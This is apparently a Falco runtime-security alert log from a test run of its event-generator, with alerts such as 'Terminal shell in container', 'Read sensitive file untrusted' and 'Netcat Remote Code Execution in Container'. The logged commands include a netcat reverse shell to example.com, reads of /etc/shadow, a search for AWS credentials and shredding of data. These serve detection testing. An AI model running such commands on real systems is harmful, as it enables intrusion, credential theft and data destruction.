{"hostname":"cef4064ab131","output":"2025-11-02T13:18:11.320180487+0000: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=containerd-shim command=sh -lc echo hello-from-shell terminal=34816 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=32095466e9a4 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"32095466e9a4","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.time.iso8601":1762089491320180487,"evt.type":"execve","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"sh -lc echo hello-from-shell","proc.exepath":"/bin/busybox","proc.name":"sh","proc.pname":"containerd-shim","proc.tty":34816,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Notice","rule":"Terminal shell in container","source":"syscall","tags":["T1059","container","maturity_stable","mitre_execution","shell"],"time":"2025-11-02T13:18:11.320180487Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:18.646114491+0000: Warning Falco Custom: File write in /usr/local/bin (container=<NA> user=root file=/usr/local/bin/drift.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER) container_id=32095466e9a4 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"32095466e9a4","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER","evt.time.iso8601":1762089498646114491,"fd.name":"/usr/local/bin/drift.txt","k8s.ns.name":null,"k8s.pod.name":null,"user.name":"root"},"priority":"Warning","rule":"Write Binary Under UsrLocalBin","source":"syscall","tags":["compliance","container","drift"],"time":"2025-11-02T13:18:18.646114491Z"}
Events detected: 2
Rule counts by severity:
   WARNING: 1
   NOTICE: 1
Triggered rules by rule name:
   Terminal shell in container: 1
   Write Binary Under UsrLocalBin: 1
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:43.971989004+0000: Warning Falco Custom: File write in /usr/local/bin (container=<NA> user=root file=/usr/local/bin/custom-rule.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER) container_id=32095466e9a4 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"32095466e9a4","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER","evt.time.iso8601":1762089523971989004,"fd.name":"/usr/local/bin/custom-rule.txt","k8s.ns.name":null,"k8s.pod.name":null,"user.name":"root"},"priority":"Warning","rule":"Write Binary Under UsrLocalBin","source":"syscall","tags":["compliance","container","drift"],"time":"2025-11-02T13:18:43.971989004Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:58.170906511+0000: Warning Sensitive file opened for reading by trusted program after startup | file=/etc/shadow pcmdline=event-generator run syscall gparent=containerd-shim ggparent=init gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=httpd proc_exepath=/bin/event-generator parent=event-generator command=httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.time.iso8601":1762089538170906511,"evt.type":"openat","fd.name":"/etc/shadow","k8s.ns.name":null,"k8s.pod.name":null,"proc.aname[2]":"containerd-shim","proc.aname[3]":"init","proc.aname[4]":null,"proc.cmdline":"httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s","proc.exepath":"/bin/event-generator","proc.name":"httpd","proc.pcmdline":"event-generator run syscall","proc.pname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Read sensitive file trusted after startup","source":"syscall","tags":["T1555","container","filesystem","host","maturity_stable","mitre_credential_access"],"time":"2025-11-02T13:18:58.170906511Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:58.286494594+0000: Warning Detected ptrace PTRACE_ATTACH attempt | proc_pcmdline=containerd-shim -namespace moby -id bf4d36e09b49319e3536126c4572f7219c5fdc36ff858c015955e5e1e5f32989 -address /run/containerd/containerd.sock evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.time.iso8601":1762089538286494594,"evt.type":"ptrace","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"event-generator run syscall","proc.exepath":"/bin/event-generator","proc.name":"event-generator","proc.pcmdline":"containerd-shim -namespace moby -id bf4d36e09b49319e3536126c4572f7219c5fdc36ff858c015955e5e1e5f32989 -address /run/containerd/containerd.sock","proc.pname":"containerd-shim","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"PTRACE attached to process","source":"syscall","tags":["T1055.008","container","host","maturity_stable","mitre_privilege_escalation","process"],"time":"2025-11-02T13:18:58.286494594Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:58.428895970+0000: Critical Executing binary not part of base image | proc_exe=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-HBx4uJ proc_sname=event-generator gparent=containerd-shim proc_exe_ino_ctime=1762089538416858011 proc_exe_ino_mtime=1762089538416858011 proc_exe_ino_ctime_duration_proc_start=7215834 proc_cwd=/ container_start_ts=1762089531056465485 evt_type=execve user=root user_uid=0 user_loginuid=-1 process=falco-event-gen proc_exepath=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-HBx4uJ parent=event-generator command=falco-event-gen terminal=0 exe_flags=EXE_WRITABLE|EXE_UPPER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"container.start_ts":1762089531056465485,"evt.arg.flags":"EXE_WRITABLE|EXE_UPPER_LAYER","evt.time.iso8601":1762089538428895970,"evt.type":"execve","k8s.ns.name":null,"k8s.pod.name":null,"proc.aname[2]":"containerd-shim","proc.cmdline":"falco-event-gen","proc.cwd":"/","proc.exe":"/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-HBx4uJ","proc.exe_ino.ctime":1762089538416858011,"proc.exe_ino.ctime_duration_proc_start":7215834,"proc.exe_ino.mtime":1762089538416858011,"proc.exepath":"/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-HBx4uJ","proc.name":"falco-event-gen","proc.pname":"event-generator","proc.sname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Critical","rule":"Drop and execute new binary in container","source":"syscall","tags":["PCI_DSS_11.5.1","TA0003","container","maturity_stable","mitre_persistence","process"],"time":"2025-11-02T13:18:58.428895970Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:58.540764803+0000: Warning Bulk data has been removed from disk | file=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=shred proc_exepath=/bin/busybox parent=event-generator command=shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-2207103576 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.time.iso8601":1762089538540764803,"evt.type":"execve","fd.name":null,"k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-2207103576","proc.exepath":"/bin/busybox","proc.name":"shred","proc.pname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Remove Bulk Data from Disk","source":"syscall","tags":["T1485","container","filesystem","host","maturity_stable","mitre_impact","process"],"time":"2025-11-02T13:18:58.540764803Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:59.647113095+0000: Critical Fileless execution via memfd_create | container_start_ts=1762089531056465485 proc_cwd=/ evt_res=SUCCESS proc_sname=event-generator gparent=containerd-shim evt_type=execve user=root user_uid=0 user_loginuid=-1 process=3 proc_exepath=memfd:program parent=event-generator command=3 run helper.DoNothing terminal=0 exe_flags=EXE_WRITABLE|EXE_FROM_MEMFD container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"container.start_ts":1762089531056465485,"evt.arg.flags":"EXE_WRITABLE|EXE_FROM_MEMFD","evt.res":"SUCCESS","evt.time.iso8601":1762089539647113095,"evt.type":"execve","k8s.ns.name":null,"k8s.pod.name":null,"proc.aname[2]":"containerd-shim","proc.cmdline":"3 run helper.DoNothing","proc.cwd":"/","proc.exepath":"memfd:program","proc.name":"3","proc.pname":"event-generator","proc.sname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Critical","rule":"Fileless execution via memfd_create","source":"syscall","tags":["T1620","container","host","maturity_stable","mitre_defense_evasion","process"],"time":"2025-11-02T13:18:59.647113095Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:18:59.937735137+0000: Warning Netcat runs inside container that allows remote code execution | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=nc proc_exepath=/usr/bin/nc parent=event-generator command=nc -e /bin/sh example.com 22 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.time.iso8601":1762089539937735137,"evt.type":"execve","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"nc -e /bin/sh example.com 22","proc.exepath":"/usr/bin/nc","proc.name":"nc","proc.pname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Netcat Remote Code Execution in Container","source":"syscall","tags":["T1059","container","maturity_stable","mitre_execution","network","process"],"time":"2025-11-02T13:18:59.937735137Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.046006720+0000: Warning File execution detected from /dev/shm | evt_res=SUCCESS file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-fdAr03.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.res":"SUCCESS","evt.time.iso8601":1762089540046006720,"evt.type":"execve","fd.name":null,"group.gid":0,"group.name":"root","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-fdAr03.sh","proc.cwd":"/","proc.exepath":"/bin/busybox","proc.name":"sh","proc.pcmdline":"event-generator run syscall","proc.pname":"event-generator","proc.tty":0,"user.loginname":"<NA>","user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Execution from /dev/shm","source":"syscall","tags":["T1059.004","container","host","maturity_stable","mitre_execution"],"time":"2025-11-02T13:19:00.046006720Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.046245512+0000: Warning File execution detected from /dev/shm | evt_res=EACCES file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-fdAr03.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.res":"EACCES","evt.time.iso8601":1762089540046245512,"evt.type":"execve","fd.name":null,"group.gid":0,"group.name":"root","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-fdAr03.sh","proc.cwd":"/","proc.exepath":"/bin/busybox","proc.name":"sh","proc.pcmdline":"event-generator run syscall","proc.pname":"event-generator","proc.tty":0,"user.loginname":"<NA>","user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Execution from /dev/shm","source":"syscall","tags":["T1059.004","container","host","maturity_stable","mitre_execution"],"time":"2025-11-02T13:19:00.046245512Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.150258262+0000: Warning Read monitored file via directory traversal | file=/etc/shadow fileraw=/etc/../etc/../etc/shadow gparent=init ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.time.iso8601":1762089540150258262,"evt.type":"openat","fd.name":"/etc/shadow","fd.nameraw":"/etc/../etc/../etc/shadow","k8s.ns.name":null,"k8s.pod.name":null,"proc.aname[2]":"init","proc.aname[3]":null,"proc.aname[4]":null,"proc.cmdline":"event-generator run syscall","proc.exepath":"/bin/event-generator","proc.name":"event-generator","proc.pname":"containerd-shim","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Directory traversal monitored file read","source":"syscall","tags":["T1555","container","filesystem","host","maturity_stable","mitre_credential_access"],"time":"2025-11-02T13:19:00.150258262Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.392758054+0000: Warning Detected AWS credentials search activity | proc_pcmdline=event-generator run syscall proc_cwd=/ group_gid=0 group_name=root user_loginname=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname .aws/credentials terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.arg.flags":"EXE_WRITABLE|EXE_LOWER_LAYER","evt.time.iso8601":1762089540392758054,"evt.type":"execve","group.gid":0,"group.name":"root","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"find /tmp -maxdepth 1 -iname .aws/credentials","proc.cwd":"/","proc.exepath":"/bin/busybox","proc.name":"find","proc.pcmdline":"event-generator run syscall","proc.pname":"event-generator","proc.tty":0,"user.loginname":"<NA>","user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Find AWS Credentials","source":"syscall","tags":["T1552","aws","container","host","maturity_stable","mitre_credential_access","process"],"time":"2025-11-02T13:19:00.392758054Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.498899971+0000: Notice Packet socket was created in a container | socket_info=fd=3(<o>) domain=17(AF_PACKET) type=3 proto=3 connection= lport=<NA> rport=<NA> fd_type=<NA> fd_proto=<NA> evt_type=socket user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.args":"fd=3(<o>) domain=17(AF_PACKET) type=3 proto=3","evt.time.iso8601":1762089540498899971,"evt.type":"socket","fd.l4proto":"<NA>","fd.lport":null,"fd.name":"","fd.rport":null,"fd.type":"<NA>","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"event-generator run syscall","proc.exepath":"/bin/event-generator","proc.name":"event-generator","proc.pname":"containerd-shim","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Notice","rule":"Packet socket created in container","source":"syscall","tags":["T1557.002","container","maturity_stable","mitre_credential_access","network"],"time":"2025-11-02T13:19:00.498899971Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.609292096+0000: Notice Detected potential PTRACE_TRACEME anti-debug attempt | proc_pcmdline=event-generator run syscall evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=event-generator command=event-generator run syscall terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.time.iso8601":1762089540609292096,"evt.type":"ptrace","k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"event-generator run syscall","proc.exepath":"/bin/event-generator","proc.name":"event-generator","proc.pcmdline":"event-generator run syscall","proc.pname":"event-generator","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Notice","rule":"PTRACE anti-debug attempt","source":"syscall","tags":["T1622","container","host","maturity_stable","mitre_defense_evasion","process"],"time":"2025-11-02T13:19:00.609292096Z"}
{"hostname":"cef4064ab131","output":"2025-11-02T13:19:00.714273137+0000: Warning Sensitive file opened for reading by non-trusted program | file=/etc/shadow gparent=init ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=bf4d36e09b49 container_name=<NA> container_image_repository=<NA> container_image_tag=<NA> k8s_pod_name=<NA> k8s_ns_name=<NA>","output_fields":{"container.id":"bf4d36e09b49","container.image.repository":null,"container.image.tag":null,"container.name":null,"evt.time.iso8601":1762089540714273137,"evt.type":"openat","fd.name":"/etc/shadow","k8s.ns.name":null,"k8s.pod.name":null,"proc.aname[2]":"init","proc.aname[3]":null,"proc.aname[4]":null,"proc.cmdline":"event-generator run syscall","proc.exepath":"/bin/event-generator","proc.name":"event-generator","proc.pname":"containerd-shim","proc.tty":0,"user.loginuid":-1,"user.name":"root","user.uid":0},"priority":"Warning","rule":"Read sensitive file untrusted","source":"syscall","tags":["T1555","container","filesystem","host","maturity_stable","mitre_credential_access"],"time":"2025-11-02T13:19:00.714273137Z"}
